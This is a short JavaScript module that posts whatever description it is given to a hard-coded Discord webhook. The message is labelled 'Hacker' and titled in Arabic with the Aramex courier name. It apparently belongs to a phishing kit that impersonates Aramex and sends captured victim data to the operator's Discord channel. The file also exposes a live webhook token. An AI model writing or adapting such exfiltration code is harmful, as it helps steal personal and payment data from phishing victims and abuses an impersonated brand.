import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328361320046923777/-4wp7ObX2rq29T-Hvmi0pWmRkSbsIOPZZA1DtyoTlPHwwO8VE6NLh6IZ9G5_Z0LWu4el",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
